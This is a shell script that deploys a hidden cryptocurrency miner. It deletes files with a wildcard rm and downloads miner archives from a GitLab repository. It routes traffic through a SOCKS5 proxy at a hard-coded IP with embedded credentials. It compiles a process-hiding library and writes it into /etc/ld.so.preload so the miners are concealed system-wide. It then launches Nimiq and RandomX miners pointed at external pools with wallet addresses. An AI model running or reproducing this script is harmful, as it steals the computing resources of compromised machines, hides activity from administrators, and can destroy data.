rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/noncerpro-cuda-linux-3.4.1.tar.gz

tar xf noncerpro-cuda-linux-3.4.1.tar.gz

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.97.145.189:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./noncerpro -a "NQ404CLMJ4FFKQGDA52CQ983Y8Y3ASH88HY8" -s nimiq.icemining.ca -p 2053 -n $(shuf -n 1 -i 1-999999) --threads=2 --mode=dumb && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
